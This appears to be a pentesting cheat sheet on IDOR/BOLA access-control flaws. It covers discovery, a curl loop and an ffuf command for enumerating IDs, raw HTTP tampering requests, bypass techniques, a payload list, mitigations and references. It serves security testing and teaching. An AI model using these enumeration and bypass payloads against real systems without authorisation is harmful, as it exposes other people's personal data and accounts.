## Overview (Theory)

IDOR, also known as Broken Object Level Authorization (BOLA), occurs when an application provides direct access to internal objects (e.g., files, database records, or resources) based on user-supplied input without verifying the user's authorization. This vulnerability allows attackers to bypass access controls, leading to unauthorized actions such as reading, modifying, or deleting data belonging to other users. It is prevalent in APIs and web endpoints that use identifiers like numeric IDs, UUIDs, or encoded strings. Successful exploitation can result in horizontal/vertical privilege escalation, data breaches, or account takeovers. IDORs are often found in parameters referencing objects, such as `/api/user/123` or `?id=42`.

## Exploitation Methods

### Identifying Potential IDORs
- Look for parameters that reference objects:
  - Path: `/api/user/1234`, `/files/550e8400-e29b-41d4-a716-446655440000`
  - Query: `?id=42`, `?invoice=2024-00001`
  - Body/JSON: `{"user_id": 321, "order_id": 987}`
  - Headers/Cookies: `X-Client-ID: 4711`
- Focus on endpoints that read or update data (GET, PUT, PATCH, DELETE).
- Note sequential or predictable identifiers (e.g., if your ID is 64185742, test 64185741).
- Explore hidden/alternate flows (e.g., login page links) for extra APIs.
- Use authenticated low-privilege sessions; change only the ID while keeping the same token/cookie.
- Conduct application recon: Fuzz endpoints returning information, search JavaScript for API endpoints/parameters.
- Test on any object returning information (easy to test, hard to discover) or state-changing functionalities (tricky to test, easy to discover).
- Enumerate users/files via error-response oracles (e.g., differences in "User not found" vs. "File does not exist").
- Create two accounts if possible; access objects from both, swap IDs, and check for unauthorized access.
- If no accounts, randomly change parameters, identify incrementing integers, or decode strings (hex, base64).

### Basic Exploitation Steps
1. Identify input vectors (e.g., `?id=12345` for database records, `?user=someuser` for operations, `?img=img00011` for files, `?menuitem=12` for functionality).
2. Access different objects from accounts, save values, then try accessing one user's object from another.
3. For unauthenticated scenarios: Randomly alter parameters or look for patterns (e.g., generate values to find patterns).
4. Test by decreasing/increasing IDs or using tools for enumeration.
5. Chain with other vulns (e.g., mass assignment to discover IDOR in state-changing funcs).

### Automated Enumeration
- Use Burp Intruder or curl loops for sequential IDs:
  ```bash
  for id in $(seq 64185742 64185700); do
    curl -s -X PUT 'https://www.example.com/api/lead/cem-xhr' \
         -H 'Content-Type: application/json' \
         -H "Cookie: auth=$TOKEN" \
         -d '{"lead_id":'"$id"'}' | jq -e '.email' && echo "Hit $id";
  done
  ```
- Fuzz usernames with tools like ffuf:
  ```bash
  ffuf -u 'http://target/view.php?username=FUZZ&file=test.doc' \
    -b 'PHPSESSID=<session-cookie>' \
    -w /opt/SecLists/Usernames/Names/names.txt \
    -fr 'User not found'
  ```
- Endpoint fuzzing:
  ```html
  /endpoints/users/me
  /endpoints/**[FUZZ]**/**[FUZZ]**
  ```

### Manual Tampering (e.g., Burp Repeater)
```http
PUT /api/lead/cem-xhr HTTP/1.1
Host: www.example.com
Cookie: auth=eyJhbGciOiJIUzI1NiJ9...
Content-Type: application/json

{"lead_id":64185741}
```

### Types of IDOR
1. Parameter used to retrieve database record: `http://foo.bar/somepage?invoice=12345`
2. Parameter for system operation: `http://foo.bar/changepassword?user=someuser`
3. Parameter for file resource: `http://foo.bar/showImage?img=img00011`
4. Parameter for app functionality: `http://foo.bar/accessPage?menuitem=12`

### Testing Checklists
- Try parameter pollution.
- Add parameters to endpoints returning info (from JS files).
- Use extensions like `/user/01` → `/user/02.json`.
- Special characters.
- Old versions: `/api/v3/users/01` → `/api/v1/users/02`.
- Change method: GET/POST/PATCH/DELETE/PUT.
- Check Referrer/other headers for ID validation.
- Decode encrypted IDs (e.g., hashes.com).
- Swap GUID with numeric ID/email.
- Try GUIDs: 0000-0000-000-00000000, 1111-11111-11111111-111111.
- Enumerate GUIDs: Google Dorks, GitHub, Wayback, AlienVault OTX, URLScan, CommonCrawl.
- If no enumeration: Sign up, reset password, analyze responses for GUID leaks.
- 403/401 bypass: Burp Intruder with 50-100 different IDs.
- Double-check functions: 403/401 but action performed.
- Chain with XSS for takeover.

### Test Cases
1. Add IDs to requests without them: `/api/MyPictureList` → `/api/MyPictureList?user_id=<other_user_id>`.
2. Replace parameter names: `/api/albums?album_id=<id>` → `/api/albums?account_id=<id>`.
3. Multiple values: `/api/account?id=<your_id>` → `/api/account?id=<your_id>&id=<admin_id>`.
4. Change method: POST → PUT for uploads.
5. Change content type: `application/xml` → `application/json`.
6. File type change (Ruby): `/user_data/2341` → `/user_data/2341.json`.
7. Non-numeric to numeric: `username=user1` → `username=1234`.
8. Array wrap: `{"id":19}` → `{"id":[19]}`.
9. Wildcard: `/api/users/<id>/` → `/api/users/*`.
10. New features: Test lax controls in recent additions like `/api/CharityEventFeb2021/user/pp/<ID>`.

## Bypasses

### Parameter Pollution
- HTTP: `user_id=hacker_id&user_id=victim_id`.
- JSON: `{"user_id":"hacker_id","user_id":"victim_id"}`.
- Array: `user_id=YOUR_USER_ID[]&user_id=ANOTHER_USERS_ID[]`.

### Endpoint/Version Manipulation
- Outdated APIs: `/v2/GetData` → `/v1/GetData`.
- Add extensions: `/v2/GetData/1234` → `/v2/GetData/1234.json`.
- Path traversal: `/users/profile/my_id/../victim_id` or `/my_id/%2f%2e%2e%2e/victim_id`.

### JSON/Object Wrapping
- Array: `{"user_id":111}` → `{"id":[111]}`.
- Nested: `{"user_id":111}` → `{"user_id":{"user_id":111}}`.

### Verb Tampering
- Change verbs: POST → DELETE, or arbitrary like "JEFF" (bypasses VBAAC).
- Use HEAD for idempotent checks without body.

### Protocol/Header Overrides
- Downgrade to HTTP/1.0, remove headers (e.g., Host).
- Non-standard headers: `X-Forwarded-For: 127.0.0.1`, `X-Originating-IP: localhost`.
- Referrer: Change to match victim: `Referrer: example.com/users/02`.

### ID Swapping/Decoding
- Decode: `dmljdGltQG1haWwuY29t` (base64) → `victim@mail.com`.
- Swap: UUID → Numeric, or email.
- Discover hidden params: Guess/fuzz like `?user_id=1001` on `/v2/profile/1000`.
- Wildcards: `/api/users/*`, `/api/users/%`, `/api/users/_`, `/api/users/.`.

### Other
- GraphQL: `/graphql?query=`, `/graphql.php?query=`.
- MFLAC: `/admin/profile` → `/ADMIN/profile`.
- Appending unusual characters: `; / " ' '; "; "); '); "] )]} %09 %20 %23 %2e %2f . ; ..; ;%09 ;%09.. ;%09..; ;%2f.. *`.
- Reverse proxy abuse: `/users/delete/MY_ID/../VICTIM_ID`.
- Use tools: 403bypasser (CLI/Burp extension).

## Payloads

1. Parameter pollution: `user_id=ATTACKER_ID&user_id=VICTIM_ID`.
2. JSON pollution: `{"user_id":"hacker_id","user_id":"victim_id"}`.
3. Array wrap: `{"id":[111]}`.
4. Nested object: `{"user_id":{"user_id":111}}`.
5. Extension: `/user/02.json`.
6. Old version: `/api/v1/users/02`.
7. Method change: `DELETE /api/users/profile/111`.
8. Content type: `Content-Type: application/json` (from xml).
9. Path traversal: `/users/profile/my_id/../victim_id`.
10. Header override: `X-Forwarded-For: 127.0.0.1`.

## Higher Impact

- Horizontal escalation: Read/update/delete other users' data (e.g., PII, orders).
- Vertical escalation: Low-priv user gains admin access.
- Mass breach: Enumerate sequential IDs (e.g., 64M records via `lead_id` in McHire case).
- Account takeover: Steal tokens, reset passwords.
- Chaining: With XSS for stored XSS/takeover; info disclosure for UUID leaks; self-XSS via editable non-public info.
- Escalation ideas: Chain low-impact IDOR (e.g., name change) with XSS; use leaked UUIDs to bypass.
- Real-world: McHire IDOR exposed 64M applicants' PII via sequential `lead_id`; combined with default creds.

## Mitigations

- Enforce object-level authorization on every request (e.g., `user_id == session.user`).
- Use indirect, unguessable identifiers (UUIDv4, ULID) over auto-increment.
- Perform server-side authorization; never rely on hidden fields/UI.
- Implement RBAC/ABAC in central middleware.
- Add rate-limiting/logging for ID enumeration detection.
- Security test new endpoints (unit, integration, DAST).
- Validate/handle non-standard headers to prevent IP-based bypasses.

## Tools

- Burp Extensions: Authorize, Authz, AuthMatrix, Auto Repeater, Turbo Intruder, Paramalyzer, 403-bypasser.
- OWASP ZAP: Auth Matrix, Forced Browse.
- Github: bwapp-idor-scanner, Blindy.
- Others: Arjun, Parameth, ffuf.

## References

- OWASP Top 10 – Broken Access Control: https://owasp.org/Top10/A01_2021-Broken_Access_Control/
- McHire Case: https://ian.sh/mcdonalds
- Vickie Li: https://medium.com/@vickieli/how-to-find-more-idors-ae2db67c9489
- HTB Nocturnal: https://0xdf.gitlab.io/2025/08/16/htb-nocturnal.html
- PortSwigger: https://portswigger.net/web-security/access-control/idor
- Bugcrowd: https://www.bugcrowd.com/blog/how-to-find-idor-insecure-direct-object-reference-vulnerabilities-for-large-bounty-rewards/
- Medium Articles: Various on account takeovers, GraphQL IDOR.
- Hackerone Reports: Examples of resolved IDORs (e.g., delete images, access payments).
- Other: https://enciphers.com/web-app-security/insecure-direct-object-reference-a-modern-age-sqli, https://ninadmathpati.com/how-critical-is-idor-vulnerability-can-it-take-down-a-whole-company/